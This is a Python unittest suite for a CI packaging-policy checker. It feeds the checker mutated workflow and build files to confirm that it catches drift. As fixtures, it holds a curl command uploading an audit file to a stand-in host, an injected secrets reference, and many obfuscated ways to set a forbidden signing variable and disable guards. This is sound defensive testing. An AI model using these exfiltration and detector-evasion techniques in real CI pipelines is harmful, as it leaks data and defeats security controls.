from __future__ import annotations

import copy
import hashlib
import importlib.util
import unittest
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "tools" / "check_packaged_smoke_policy.py"
SPEC = importlib.util.spec_from_file_location("check_packaged_smoke_policy", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
CHECKER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(CHECKER)


def inputs() -> dict[str, object]:
    return CHECKER.load_inputs()


def changed(current: dict[str, object], key: str, old: str, new: str) -> None:
    value = str(current[key])
    if old not in value:
        raise AssertionError(f"fixture marker missing: {old!r}")
    current[key] = value.replace(old, new, 1)


class PackagedSmokePolicyTests(unittest.TestCase):
    def test_current_engineering_smoke_boundary_is_consistent(self) -> None:
        self.assertEqual(CHECKER.validate_policy(inputs()), [])

    def test_policy_input_universe_is_closed(self) -> None:
        current = inputs()
        del current["bundle_audit"]
        self.assertIn(
            "packaged-smoke policy input set drifted",
            CHECKER.validate_policy(current),
        )

    def test_dispatch_tag_and_pull_request_target_triggers_fail(self) -> None:
        for trigger in ("  workflow_dispatch:\n", "  pull_request_target:\n", "    tags:\n"):
            with self.subTest(trigger=trigger.strip()):
                current = inputs()
                changed(current, "workflow", "concurrency:\n", trigger + "\nconcurrency:\n")
                self.assertTrue(
                    any("trigger" in error or "forbidden control" in error for error in CHECKER.validate_policy(current))
                )

    def test_duplicate_top_level_keys_and_step_skip_controls_fail(self) -> None:
        current = inputs()
        current["workflow"] = str(current["workflow"]) + "\njobs: {}\n"
        self.assertTrue(any("top-level key" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Build and audit locked Python sidecar",
            "      - name: Build and audit locked Python sidecar\n        if: false",
        )
        self.assertTrue(any("repository guard" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(current, "workflow", "        shell: bash", "        shell: python")
        self.assertTrue(any("shell selection" in error for error in CHECKER.validate_policy(current)))

    def test_push_must_remain_main_only(self) -> None:
        current = inputs()
        changed(current, "workflow", "      - main\n", "      - '**'\n")
        self.assertIn(
            "workflow triggers must be exactly pull_request plus main push",
            CHECKER.validate_policy(current),
        )

    def test_permissions_environment_and_secrets_fail(self) -> None:
        mutations = (
            ("contents: read", "contents: write", "write permissions"),
            ("contents: read", "contents: read\n  issues: write", "permissions"),
            ("    runs-on: macos-15", "    environment: macos-signing\n    runs-on: macos-15", "Environment"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets.BAD }}\n      CI: \"true\"", "GitHub secrets"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets['BAD'] }}\n      CI: \"true\"", "GitHub secrets"),
        )
        for old, new, expected in mutations:
            with self.subTest(expected=expected):
                current = inputs()
                changed(current, "workflow", old, new)
                self.assertTrue(any(expected in error for error in CHECKER.validate_policy(current)))

    def test_actions_must_be_full_sha_pinned_and_allowlisted(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.CHECKOUT_SHA, "v6")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("action" in error for error in errors))

    def test_checkout_and_source_sha_cannot_fall_back_to_pr_merge(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            f"LCF_SOURCE_SHA: {CHECKER.SOURCE_EXPRESSION}",
            "LCF_SOURCE_SHA: ${{ github.sha }}",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

        current = inputs()
        changed(current, "workflow", "persist-credentials: false", "persist-credentials: true")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

    def test_artifact_cache_release_and_app_launch_surfaces_fail(self) -> None:
        additions = (
            "      - uses: actions/upload-artifact@" + "a" * 40 + "\n",
            "      - uses: actions/cache@" + "a" * 40 + "\n",
            "      - run: gh release create v0.0.0\n",
            "      - run: /usr/bin/open 'release-smoke/App.app'\n",
            "      - run: release-smoke/App.app/Contents/MacOS/App\n",
            "      - run: spctl --assess release-smoke/App.app\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["workflow"] = str(current["workflow"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

    def test_python_source_urls_and_digests_are_locked(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.PYTHON_ARCHIVE_SHA256, "0" * 64)
        self.assertTrue(any("Python source lock" in error for error in CHECKER.validate_policy(current)))

    def test_python_runner_inputs_are_persisted_after_source_verification(self) -> None:
        mutations = (
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_archive}\"\n",
                "",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_hashes}\"\n",
                "",
            ),
            (
                "printf 'LCF_PYTHON_INSTALL_ROOT=%s\\n' \\\n"
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n',
                "",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_archive}\"",
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_hashes}\"",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_hashes}\"",
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_archive}\"",
            ),
            (
                "/Library/Frameworks/Python.framework/Versions/3.13",
                "/Library/Frameworks/Python.framework/Versions/3.12",
            ),
            ('} >> "${GITHUB_ENV}"', '} >> "${GITHUB_OUTPUT}"'),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                self.assertIn(
                    "workflow Python runner input binding drifted",
                    CHECKER.validate_policy(current),
                )

        current = inputs()
        binding = (
            "            printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' "
            '"${python_archive}"'
        )
        changed(current, "workflow", binding, f"{binding}\n{binding}")
        self.assertIn(
            "workflow Python runner input binding drifted",
            CHECKER.validate_policy(current),
        )

        overrides = (
            (
                "      LCF_GITHUB_CONTEXT_SHA: ${{ github.sha }}",
                "      LCF_GITHUB_CONTEXT_SHA: ${{ github.sha }}\n"
                "      LCF_PYTHON_INSTALL_ROOT: /tmp/unreviewed",
            ),
            (
                "      - name: Assemble and statically audit app directory",
                "      - name: Assemble and statically audit app directory\n"
                "        env:\n"
                "          LCF_PYTHON_DISTRIBUTION_ARCHIVE: /tmp/unreviewed",
            ),
        )
        for old, new in overrides:
            with self.subTest(override=new):
                current = inputs()
                changed(current, "workflow", old, new)
                errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "workflow Python runner input binding drifted",
                    errors,
                )
                if "\n        env:" in new:
                    self.assertIn("workflow environment surface drifted", errors)

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Assemble and statically audit app directory",
            "      - name: Assemble and statically audit app directory\n"
            '        "env":\n'
            '          "LCF_PYTHON\\u005fINSTALL_ROOT": /tmp/unreviewed',
        )
        self.assertIn(
            "workflow document contract drifted",
            CHECKER.validate_policy(current),
        )

    def test_required_commands_cannot_be_satisfied_by_comments(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            "        run: make python-sidecar-build",
            "        run: |\n          # make python-sidecar-build\n          true",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("run-step contract" in error or "required command" in error for error in errors)
        )

    def test_unreviewed_outbound_upload_command_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            '          cat "${audit_json}"',
            '          cat "${audit_json}"\n          curl --upload-file "${audit_json}" https://example.invalid/evidence',
        )
        self.assertTrue(
            any("run-step contract" in error for error in CHECKER.validate_policy(current))
        )

    def test_pr_ad_hoc_signing_control_is_pack_command_local(self) -> None:
        for replacement in (
            "npm --prefix desktop run pack:engineering-smoke",
            "CSC_FOR_PULL_REQUEST=1 npm --prefix desktop run pack:engineering-smoke",
            (
                "CSC_FOR_PULL_REQUEST=true "
                "npm --prefix desktop run prepare:engineering-smoke"
            ),
        ):
            with self.subTest(replacement=replacement):
                current = inputs()
                changed(
                    current,
                    "workflow",
                    CHECKER.ENGINEERING_ADHOC_PACK_COMMAND,
                    replacement,
                )
                self.assertIn(
                    "workflow PR ad-hoc signing control drifted",
                    CHECKER.validate_policy(current),
                )

        current = inputs()
        changed(
            current,
            "workflow",
            CHECKER.ENGINEERING_ADHOC_PACK_COMMAND,
            f"{CHECKER.ENGINEERING_ADHOC_PACK_COMMAND}\n"
            "          export CSC_FOR_PULL_REQUEST=true",
        )
        self.assertIn(
            "workflow PR ad-hoc signing control drifted",
            CHECKER.validate_policy(current),
        )

    def test_only_locked_python_installer_spctl_is_allowed(self) -> None:
        current = inputs()
        current["makefile"] = str(current["makefile"]) + "\n\t/usr/sbin/spctl --assess Bad.app\n"
        self.assertTrue(any("spctl" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "makefile",
            '/usr/sbin/spctl --assess --type install --verbose=4 "$(PYTHON_SIDECAR_INSTALLER)"',
            "true",
        )
        self.assertTrue(any("spctl" in error for error in CHECKER.validate_policy(current)))

    def test_generic_desktop_or_companion_build_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            "npm --prefix desktop run build:engineering-smoke",
            "npm --prefix desktop run build",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("generic build" in error or "required command" in error for error in errors))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:engineering-smoke"] = "npm run build:companion"
        current["package"] = package
        self.assertTrue(any("engineering build" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:preload:engineering-smoke"] = "npm run build:companion"
        current["package"] = package
        self.assertTrue(any("script" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["devDependencies"]["@electron/asar"] = "^3.4.1"
        current["package"] = package
        self.assertTrue(any("ASAR auditor dependency" in error for error in CHECKER.validate_policy(current)))

    def test_smoke_config_cannot_extend_formal_or_add_release_targets(self) -> None:
        additions = (
            "\nextends: electron-builder.yml\n",
            "\n  - target: dmg\n",
            "\npublish:\n  provider: github\n",
            "\n  - from: generated/qmd\n    to: qmd\n",
            "\n  - from: resources/update\n    to: update\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["smoke_config"] = str(current["smoke_config"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

        current = inputs()
        changed(
            current,
            "smoke_config",
            "appId: dev.localcontextforge.engineering-smoke",
            "# appId: dev.localcontextforge.engineering-smoke\nappId: dev.example.evil",
        )
        self.assertTrue(any("allowlist" in error for error in CHECKER.validate_policy(current)))

    def test_formal_boundary_cannot_reference_smoke_config(self) -> None:
        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"]) + "\n# electron-builder.smoke.yml\n"
        )
        self.assertTrue(any("formal workflow" in error for error in CHECKER.validate_policy(current)))

        for addition in (
            '\nenv:\n  "CSC_FOR_PULL\\u005fREQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PULL\\x5fREQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\u004cL_REQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\x4cL_REQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\U0000004cL_REQUEST": true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PULL"_"REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU${EMPTY}LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: |\n'
            '          export CSC_FOR_PU\\\n'
            '            LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: |\n'
            '          unset EMPTY\n'
            '          export CSC_FOR_PU"$EMPTY"LL_REQUEST=true\n',
            '\nenv:\n  "CSC_FOR_PU\\u{4c}L_REQUEST": true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            "    steps:\n      - run: export CSC_FOR_PU$'\\x4c'L_REQUEST=true\n",
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU$(printf L)L_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU"$@"LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU"$(true)"LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: node -e \'process.env["CSC_FOR_PU" + "LL_REQUEST"]="true"\'\n',
        ):
            with self.subTest(addition=addition):
                current = inputs()
                current["formal_workflow"] = str(current["formal_workflow"]) + addition
                self.assertIn(
                    "formal workflow document contract drifted",
                    CHECKER.validate_policy(current),
                )
                expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
                expected_hashes["formal workflow"] = hashlib.sha256(
                    str(current["formal_workflow"]).encode("utf-8")
                ).hexdigest()
                with mock.patch.object(
                    CHECKER,
                    "EXPECTED_FORMAL_BOUNDARY_SHA256",
                    expected_hashes,
                ):
                    self.assertIn(
                        "formal workflow must not use the engineering PR signing control",
                        CHECKER.validate_policy(current),
                    )

        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"])
            + "\n# CSC_FOR_PULLING_NOT_A_CONTROL\n"
        )
        expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
        expected_hashes["formal workflow"] = hashlib.sha256(
            str(current["formal_workflow"]).encode("utf-8")
        ).hexdigest()
        with mock.patch.object(
            CHECKER,
            "EXPECTED_FORMAL_BOUNDARY_SHA256",
            expected_hashes,
        ):
            self.assertNotIn(
                "formal workflow must not use the engineering PR signing control",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"]) + "\nCSC_FOR_PULL_REQUEST=true\n"
        )
        self.assertTrue(any("formal workflow" in error for error in CHECKER.validate_policy(current)))

    def test_engineering_hooks_cannot_import_formal_release_logic(self) -> None:
        current = inputs()
        current["before_pack"] = str(current["before_pack"]) + '\nrequire("./prepareRelease.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        current["after_pack"] = str(current["after_pack"]) + '\nrequire("./resealPackagedRuntimes.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

    def test_bundle_auditor_cannot_launch_the_app(self) -> None:
        current = inputs()
        current["bundle_audit"] = (
            str(current["bundle_audit"])
            + '\nexecFileSync("release-smoke/App.app/Contents/MacOS/App");\n'
        )
        self.assertTrue(any("launch" in error for error in CHECKER.validate_policy(current)))

    def test_pyinstaller_archive_exception_cannot_expand(self) -> None:
        mutations = (
            (
                "Contents/Resources/sidecar/_internal/base_library.zip",
                "Contents/Resources/sidecar/evil.zip",
            ),
            ("        info.nlink === 1 &&", "        true &&"),
            (
                '(lower.endsWith(".zip") && !isReviewedPyInstallerArchive)',
                'lower.endsWith(".zip") && false',
            ),
            (
                "if (!observedReviewedPyInstallerArchive) {",
                "if (false) {",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "bundle_audit", old, new)
                self.assertIn(
                    "engineering PyInstaller archive exception drifted",
                    CHECKER.validate_policy(current),
                )

        document_contract_mutations = (
            (
                "let observedReviewedPyInstallerArchive = false;",
                "let observedReviewedPyInstallerArchive = true;",
            ),
            (
                '(lower.endsWith(".zip") && !isReviewedPyInstallerArchive)',
                '((lower.endsWith(".zip") && !isReviewedPyInstallerArchive) && false)',
            ),
        )
        for old, new in document_contract_mutations:
            with self.subTest(document_contract=old):
                current = inputs()
                changed(current, "bundle_audit", old, new)
                self.assertIn(
                    "engineering bundle auditor document contract drifted",
                    CHECKER.validate_policy(current),
                )
                with mock.patch.object(
                    CHECKER,
                    "EXPECTED_BUNDLE_AUDIT_SHA256",
                    hashlib.sha256(
                        str(current["bundle_audit"]).encode("utf-8")
                    ).hexdigest(),
                ):
                    self.assertIn(
                        "engineering PyInstaller archive exception drifted",
                        CHECKER.validate_policy(current),
                    )

    def test_prepare_pr_signing_guard_cannot_be_neutralized(self) -> None:
        current = inputs()
        changed(
            current,
            "prepare",
            '    Object.prototype.hasOwnProperty.call(environment, "CSC_FOR_PULL_REQUEST") &&',
            '    false &&\n'
            '    Object.prototype.hasOwnProperty.call(environment, "CSC_FOR_PULL_REQUEST") &&',
        )
        self.assertIn(
            "engineering prepare document contract drifted",
            CHECKER.validate_policy(current),
        )
        mutated_prepare = str(current["prepare"])
        mutated_prepare_function = CHECKER._source_block(
            mutated_prepare,
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(mutated_prepare.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(mutated_prepare_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering PR signing guard drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "prepare",
            "function assertNoProductionEnvironment(environment) {",
            "function assertNoProductionEnvironment(environment) {\n  return;",
        )
        mutated_prepare = str(current["prepare"])
        mutated_prepare_function = CHECKER._source_block(
            mutated_prepare,
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(mutated_prepare.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(mutated_prepare_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering production-environment control flow drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        original_function = CHECKER._source_block(
            str(current["prepare"]),
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        body = original_function.split("{\n", 1)[1].rsplit("\n}", 1)[0]
        wrapped_function = (
            "function assertNoProductionEnvironment(environment) {\n"
            "  if (false) {\n  "
            + body.replace("\n", "\n  ")
            + "\n  }\n}\n"
        )
        current["prepare"] = str(current["prepare"]).replace(
            original_function,
            wrapped_function,
            1,
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(str(current["prepare"]).encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(wrapped_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering production-environment control flow drifted",
                CHECKER.validate_policy(current),
            )

    def test_archive_observation_cannot_be_preseeded_after_initialization(self) -> None:
        current = inputs()
        changed(
            current,
            "bundle_audit",
            "  let observedReviewedPyInstallerArchive = false;",
            "  let observedReviewedPyInstallerArchive = false;\n"
            "  observedReviewedPyInstallerArchive = true;",
        )
        mutated_bundle_audit = str(current["bundle_audit"])
        mutated_artifact_function = CHECKER._source_block(
            mutated_bundle_audit,
            "function assertNoInstallOrReleaseArtifacts",
            "\nfunction writeExternalEvidence",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BUNDLE_AUDIT_SHA256",
            hashlib.sha256(mutated_bundle_audit.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_INSTALL_ARTIFACT_FUNCTION_SHA256",
            hashlib.sha256(mutated_artifact_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering install-artifact control flow drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "bundle_audit",
            "  if (forbidden.length > 0) {",
            "  forbidden.length = 0;\n  if (forbidden.length > 0) {",
        )
        mutated_bundle_audit = str(current["bundle_audit"])
        mutated_artifact_function = CHECKER._source_block(
            mutated_bundle_audit,
            "function assertNoInstallOrReleaseArtifacts",
            "\nfunction writeExternalEvidence",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BUNDLE_AUDIT_SHA256",
            hashlib.sha256(mutated_bundle_audit.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_INSTALL_ARTIFACT_FUNCTION_SHA256",
            hashlib.sha256(mutated_artifact_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering install-artifact control flow drifted",
                CHECKER.validate_policy(current),
            )

    def test_critical_allowlists_and_callers_are_closed(self) -> None:
        mutations = (
            (
                "prepare",
                '  "CSC_KEYCHAIN",\n',
                "",
                "engineering forbidden production environment set drifted",
            ),
            (
                "bundle_audit",
                "  `${PRODUCT_NAME} Helper (Renderer).app`\n",
                "  `${PRODUCT_NAME} Helper (Renderer).app`,\n"
                '  "Evil Helper.app"\n',
                "engineering Electron helper allowlist drifted",
            ),
            (
                "prepare",
                "function validateHost(platformName, architecture) {",
                "assertNoProductionEnvironment = () => {};\n\n"
                "function validateHost(platformName, architecture) {",
                "engineering production-environment caller closure drifted",
            ),
            (
                "bundle_audit",
                "function createAuditEngineeringSmokeBundle(dependencies = {}) {",
                "assertNoInstallOrReleaseArtifacts = () => {};\n\n"
                "function createAuditEngineeringSmokeBundle(dependencies = {}) {",
                "engineering install-artifact caller closure drifted",
            ),
            (
                "bundle_audit",
                "    assertNoInstallOrReleaseArtifacts(outputRoot, appRoot);\n",
                "",
                "engineering install-artifact caller closure drifted",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                if key == "prepare":
                    document_hash = hashlib.sha256(
                        str(current[key]).encode("utf-8")
                    ).hexdigest()
                    patch = mock.patch.object(
                        CHECKER,
                        "EXPECTED_PREPARE_SHA256",
                        document_hash,
                    )
                else:
                    document_hash = hashlib.sha256(
                        str(current[key]).encode("utf-8")
                    ).hexdigest()
                    patch = mock.patch.object(
                        CHECKER,
                        "EXPECTED_BUNDLE_AUDIT_SHA256",
                        document_hash,
                    )
                with patch:
                    self.assertIn(expected, CHECKER.validate_policy(current))

    def test_manifest_schema_cannot_be_open_or_publishable(self) -> None:
        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["additionalProperties"] = True
        current["schema"] = schema
        self.assertTrue(any("additional properties" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["distribution"]["properties"]["publishable"]["const"] = True
        current["schema"] = schema
        self.assertTrue(any("constant" in error for error in CHECKER.validate_policy(current)))

    def test_w02_status_cannot_regress_or_promote_the_gate(self) -> None:
        current = inputs()
        changed(
            current,
            "todo",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `in-progress` |",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `planned` |",
        )
        self.assertTrue(any("W02 TODO" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        row = next(
            line
            for line in str(current["trace"]).splitlines()
            if line.startswith("| VAL-PACKAGED-SMOKE-001 |")
        )
        current["trace"] = str(current["trace"]).replace(
            row, row.replace("`not-run`", "`pass`", 1), 1
        )
        self.assertTrue(any("canonically not-run" in error for error in CHECKER.validate_policy(current)))

    def test_w02a_cannot_become_a_stable_id(self) -> None:
        current = inputs()
        current["iteration"] = str(current["iteration"]) + "\nTODO-W02A-001\n"
        self.assertTrue(any("stable ID" in error for error in CHECKER.validate_policy(current)))


if __name__ == "__main__":
    unittest.main()
